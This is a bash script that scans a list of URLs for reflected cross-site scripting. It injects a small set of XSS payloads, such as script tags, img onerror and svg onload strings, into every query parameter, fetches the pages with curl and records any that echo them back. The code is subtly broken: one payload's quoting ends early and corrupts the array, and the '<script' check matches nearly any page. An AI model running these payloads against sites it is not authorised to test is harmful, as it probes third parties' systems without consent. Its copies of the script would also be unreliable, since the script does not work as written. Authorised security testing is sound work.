#!/usr/bin/env bash
set -euo pipefail
URL_FILE="${1:?file of urls required}"
OUTDIR="${2:-outputs}"
mkdir -p "$OUTDIR/reflect_results"

echo "Running reflected XSS marker checks (throttled)"
MARKER="XSS_TEST_123"

# small payload list
payloads=(
  "<script>alert(${MARKER})</script>"
  ""><img src=x onerror=alert('${MARKER}')>"
  "'><svg/onload=alert('${MARKER}')>"
  "%3Cscript%3Ealert('${MARKER}')%3C/script%3E"
  "%3E%3Cb%3E${MARKER}%3C%2Fb%3E"
)

while IFS= read -r url; do
  if [[ -z "$url" ]]; then
    continue
  fi
  if [[ "$url" != *"="* ]]; then
    continue
  fi
  for pl in "${payloads[@]}"; do
    # inject into all param values (simple heuristic)
    testurl=$(echo "$url" | sed -E "s/=[^&]*/=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$pl")/g")
    outtmp="/tmp/xss_check_$$.html"
    curl -s "$testurl" -o "$outtmp" || true
    if grep -q "$MARKER" "$outtmp" || grep -q "onerror" "$outtmp" || grep -q "<script" "$outtmp"; then
      echo "[+] Possible reflection: $testurl" | tee -a "$OUTDIR/reflect_results/found.txt"
      safe_name=$(echo "$testurl" | sed 's/[^a-zA-Z0-9]/_/g')
      cp "$outtmp" "$OUTDIR/reflect_results/${safe_name}.html"
    fi
    sleep 0.2
  done
done < "$URL_FILE"

echo "[*] Reflected checks complete. Found entries:"
ls -1 "$OUTDIR/reflect_results" | sed -n '1,200p' || true
